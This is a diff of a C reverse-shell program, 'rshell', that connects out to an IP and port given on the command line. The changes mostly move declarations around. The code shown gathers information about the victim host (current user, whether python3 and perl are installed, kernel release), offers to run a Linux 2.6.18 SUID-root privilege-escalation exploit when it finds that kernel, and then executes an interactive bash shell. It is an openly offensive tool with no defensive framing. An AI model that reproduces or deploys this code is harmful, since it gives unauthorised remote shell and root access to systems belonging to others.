@@ -19,26 +19,12 @@ int EXISTS(const char *path){
 }
 
 int main(int argc, char * argv[]){
-        // SETTING ALL VAR
         argc--;   argv++;
-        struct sockaddr_in revsockaddr;
-        register struct passwd *pw;
-        register uid_t uid;
-        int c;
-        uid = geteuid ();
-        pw = getpwuid (uid);
-        char answer;
-        char *ret;
-        struct utsname uts;
-        ret = strstr(uts.release, "2.6.18");
-        uname(&uts);
-        char *args[] = {"/usr/bin/bash", "-i", 0};
-        char *envp[] = {"/usr/bin/bash", 0};
-        // CHECKING IF THE PROGRAM HAS THE IP / PORT
         if (argc < 2) {
                 printf( "Usage: ./rshell ip port\n" );
                 exit(0);
         }
+        struct sockaddr_in revsockaddr;
 
         puts("[i] Connecting");
 
@@ -56,11 +42,17 @@ int main(int argc, char * argv[]){
         puts("[i] Im going to stabilize the shell. But before im looking around for some informations about the machine.");
         
         //FIND USER
+        register struct passwd *pw;
+        register uid_t uid;
+        int c;
+        uid = geteuid ();
+        pw = getpwuid (uid);
         if (pw){
                 puts("[i] User who started the program:");
                 puts (pw->pw_name);
         }
-        fprintf (stderr,"%s: cannot find username for UID %u\n", _PROGRAM_NAME, (unsigned) uid);
+        fprintf (stderr,"%s: cannot find username for UID %u\n",
+        _PROGRAM_NAME, (unsigned) uid);
 
         // FIND IF PYTHON3 AND PERL ARE INSTALLED
         if(EXISTS("/usr/bin/python3")){
@@ -71,11 +63,16 @@ int main(int argc, char * argv[]){
         } else{ puts("[-] Perl os not on the machine.");}
         
         // FIND OS INFO
+        struct utsname uts;
+        uname(&uts);
         printf("[i] System is %s on %s hardware\n",uts.sysname, uts.machine);
         printf("[i] OS Release is %s\n",uts.release);
         printf("[i] OS Version is %s\n",uts.version);
 
         // PRIVESC
+        char answer;
+        char *ret;
+        ret = strstr(uts.release, "2.6.18");
         if(ret){
                 puts("[?] Before stabilizing, i may have found a way to privesc,do you want me to try to privesc by using the Linux 2.6.18 SUID ROOT exploit?");
                 scanf("%c", &answer);
@@ -88,6 +85,8 @@ int main(int argc, char * argv[]){
 
         // STABILIZE
         puts("[+] Stabilized");
+        char *args[] = {"/usr/bin/bash", "-i", 0};
+        char *envp[] = {"/usr/bin/bash", 0};
         execve(args[0], &args[0], envp);
         return 0;
 }
